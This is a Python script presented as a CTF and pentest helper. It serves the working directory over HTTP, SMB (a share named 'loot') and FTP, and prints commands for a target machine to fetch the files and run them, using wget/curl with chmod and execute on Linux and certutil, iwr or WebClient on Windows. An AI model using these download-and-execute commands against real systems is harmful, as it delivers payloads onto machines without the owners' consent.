#!/usr/bin/env python3
"""
serve_local.py
--------------
Python port of serve_local.sh.
Serves the current directory with multiple protocols and generates download commands.
Focuses on ADHD-friendly UX (emojis, spacing, high-contrast scannability).
"""

import os
import sys
import socket
import subprocess
import urllib.parse
import signal
import time

# ── ANSI colours ──────────────────────────────────────────────────────────────
R  = "\033[0;31m"
G  = "\033[0;32m"
Y  = "\033[1;33m"
B  = "\033[0;34m"
C  = "\033[0;36m"
M  = "\033[0;35m"
W  = "\033[0;37m"
# Bright variants
BR = "\033[1;31m"
BG = "\033[1;32m"
BY = "\033[1;33m"
BB = "\033[1;34m"
BM = "\033[1;35m"
BC = "\033[1;36m"
BO = "\033[1m"
DIM = "\033[2m"
NC = "\033[0m"

BANNER = f"""{BO}{BC}
  ____                              _                     _
 / ___|  ___ _ ____   _____        | |    ___   ___  __ _| |
 \\___ \\ / _ \\ '__\\ \\ / / _ \\       | |   / _ \\ / __|/ _` | |
  ___) |  __/ |   \\ V /  __/       | |__| (_) | (__| (_| | |
 |____/ \\___|_|    \\_/ \\___|  _____|_____\\___/ \\___|\\__,_|_|
                             |_____|
{NC}{BM}  Multi-Protocol Local File Server | CTF & Pentest Tool{NC}
  Zero-dependency Python version | ADHD-Friendly UX
"""

# ── Helpers ───────────────────────────────────────────────────────────────────

def prompt(label: str, default: str = "") -> str:
    default_hint = f" {DIM}[Enter for {BG}{default}{NC}{DIM}]{NC}" if default else ""
    sys.stdout.write(f"\n{BY}👉 {label}{default_hint}\n{BC}❯ {NC}")
    sys.stdout.flush()
    val = input().strip()
    return val if val else default


def choose(label: str, options: list[tuple[str, str]]) -> str:
    print(f"\n{BM}📋 {label}{NC}")
    for i, (key, desc) in enumerate(options, 1):
        print(f"  [{BC}{i}{NC}] {BO}{key}{NC} {DIM}— {desc}{NC}")
    while True:
        sys.stdout.write(f"\n{BY}👉 Enter number: {NC}")
        sys.stdout.flush()
        raw = input().strip()
        if raw.isdigit() and 1 <= int(raw) <= len(options):
            return options[int(raw) - 1][0]
        print(f"{BR}❌ Invalid. Enter a number between 1 and {len(options)}.{NC}")


def section(title: str):
    width = 60
    bar = "═" * width
    print(f"\n{BC}╔{bar}╗{NC}")
    print(f"{BC}║{NC}  {BO}{title}{NC}")
    print(f"{BC}╚{bar}╝{NC}")


def get_ip_addresses() -> list[tuple[str, str]]:
    """Returns a list of (interface, ip) pairs using 'ip addr'."""
    try:
        output = subprocess.check_output(["ip", "-o", "-4", "addr", "show"], text=True)
        interfaces = []
        for line in output.splitlines():
            parts = line.split()
            if len(parts) >= 4:
                iface = parts[1]
                ip = parts[3].split('/')[0]
                if iface != 'lo':
                    interfaces.append((iface, ip))
        return interfaces
    except Exception:
        # Fallback for systems without 'ip' command
        return [('default', socket.gethostbyname(socket.gethostname()))]


def url_encode(s: str) -> str:
    return s.replace("%", "%25").replace("#", "%23").replace(" ", "%20")


# ── Logic ─────────────────────────────────────────────────────────────────────

def main():
    print(BANNER)

    # 1. Interface Selection
    ifaces = get_ip_addresses()
    if not ifaces:
        print(f"{BR}🚨 ERROR: No active network interfaces found.{NC}")
        sys.exit(1)

    print(f"{BM}🌐 Select Network Interface:{NC}")
    for i, (iface, ip) in enumerate(ifaces, 1):
        print(f"  [{BC}{i}{NC}] {BO}{iface}{NC} {DIM}({ip}){NC}")
    
    while True:
        choice = prompt("Select interface number", "1")
        if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
            interface, local_ip = ifaces[int(choice) - 1]
            break
        print(f"{BR}❌ Invalid selection.{NC}")

    print(f"\n{BG}✅ Using {BO}{interface}{NC}{BG} at {BO}{local_ip}{NC}")

    # 2. File Selection
    files = [f for f in os.listdir('.') if os.path.isfile(f)]
    if not files:
        print(f"{BY}⚠️ No files found in the current directory.{NC}")
        sys.exit(0)

    print(f"\n{BM}📁 Files in current directory:{NC}")
    for i, f in enumerate(files, 1):
        print(f"  [{BC}{i}{NC}] {f}")

    selected_files = []
    while True:
        choice = prompt("Enter numbers (e.g. 1 2 4) or 'all'", "all")
        if choice.lower() == 'all':
            selected_files = files
            break
        try:
            idxs = [int(i) - 1 for i in choice.replace(',', ' ').split()]
            selected_files = [files[i] for i in idxs if 0 <= i < len(files)]
            if selected_files:
                break
        except Exception:
            pass
        print(f"{BR}❌ Invalid input. Use numbers separated by spaces or 'all'.{NC}")

    print(f"\n{BG}✅ Selected: {NC}{', '.join(selected_files)}")

    # 3. Target OS
    target_os = choose("Target Operating System:", [("linux", "🐧 Linux / Unix"), ("windows", "🪟 Windows")])

    # 4. Protocol Selection
    proto_choice = choose("Select Protocols to serve:", [
        ("HTTP", "Web (Python built-in)"),
        ("SMB", "Windows Share (Impacket)"),
        ("FTP", "File Transfer (pyftpdlib)"),
        ("ALL", "Start ALL of the above")
    ])

    # 5. Port Configuration
    ports = {'HTTP': 8000, 'SMB': 445, 'FTP': 2121}
    # Check for root if using port 445
    is_root = os.getuid() == 0
    if not is_root and (proto_choice == "SMB" or proto_choice == "ALL"):
        print(f"\n{BY}⚠️ NOTE: SMB (445) requires root. Falling back to port 8445 for non-root.{NC}")
        ports['SMB'] = 8445

    # 6. Generate Commands
    section("🚀 DOWNLOAD COMMANDS")
    for filename in selected_files:
        enc = url_encode(filename)
        print(f"\n{BO}📄 File: {BC}{filename}{NC}")

        if proto_choice in ["HTTP", "ALL"]:
            print(f"  {BM}▶ HTTP ({target_os}):{NC}")
            url = f"http://{local_ip}:{ports['HTTP']}/{enc}"
            if target_os == "linux":
                print(f"    {BC}wget -qO- {url} > {filename} && chmod +x {filename} && ./{filename}{NC}")
                print(f"    {BC}curl -fsSL {url} -o {filename} && chmod +x {filename} && ./{filename}{NC}")
            else:
                print(f"    {BC}certutil -urlcache -split -f {url} {filename} && .\\{filename}{NC}")
                print(f"    {BC}iwr -Uri {url} -OutFile {filename}; .\\{filename}{NC}")

        if proto_choice in ["SMB", "ALL"]:
            print(f"  {BM}▶ SMB ({target_os}):{NC}")
            if target_os == "linux":
                print(f"    {BC}smbclient //[{local_ip}]/loot -c 'get \"{filename}\" \"{filename}\"' && chmod +x \"{filename}\"{NC}")
            else:
                smb_path = f"\\\\{local_ip}\\loot\\{filename}"
                print(f"    {BC}copy {smb_path} . && .\\{filename}{NC}")
                print(f"    {BC}net use X: \\\\{local_ip}\\loot; copy X:\\{filename} .; .\\{filename}{NC}")

        if proto_choice in ["FTP", "ALL"]:
            print(f"  {BM}▶ FTP ({target_os}):{NC}")
            url = f"ftp://{local_ip}:{ports['FTP']}/{filename}"
            if target_os == "linux":
                print(f"    {BC}wget --no-passive-ftp {url}{NC}")
            else:
                print(f"    {BC}(New-Object System.Net.WebClient).DownloadFile('{url}', '{filename}'){NC}")

    # 7. Start Servers
    section("⚡ STARTING SERVERS")
    processes = []
    
    try:
        if proto_choice in ["HTTP", "ALL"]:
            print(f"{BG}🟢 Starting HTTP server on port {ports['HTTP']}...{NC}")
            p = subprocess.Popen([sys.executable, "-m", "http.server", str(ports['HTTP'])],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            processes.append(p)

        if proto_choice in ["SMB", "ALL"]:
            print(f"{BG}🟢 Starting SMB server on port {ports['SMB']} (Share: loot)...{NC}")
            # Try impacket-smbserver
            smb_cmd = ["impacket-smbserver", "-smb2support", "loot", os.getcwd(), "-p", str(ports['SMB'])]
            try:
                p = subprocess.Popen(smb_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                processes.append(p)
            except FileNotFoundError:
                print(f"{BR}❌ ERROR: 'impacket-smbserver' not found. Please 'pip install impacket'.{NC}")

        if proto_choice in ["FTP", "ALL"]:
            print(f"{BG}🟢 Starting FTP server on port {ports['FTP']}...{NC}")
            ftp_cmd = [sys.executable, "-m", "pyftpdlib", "-p", str(ports['FTP']), "-d", os.getcwd()]
            try:
                p = subprocess.Popen(ftp_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                processes.append(p)
            except Exception:
                print(f"{BR}❌ ERROR: 'pyftpdlib' failed to start. Please 'pip install pyftpdlib'.{NC}")

        if not processes:
            print(f"{BR}🚨 No servers could be started.{NC}")
            sys.exit(1)

        print(f"\n{BY}🛸 Servers are running! Press Ctrl+C to stop.{NC}\n")
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print(f"\n{BM}🧹 Shutting down servers...{NC}")
        for p in processes:
            p.terminate()
        print(f"{BG}✅ Done.{NC}")


if __name__ == "__main__":
    main()
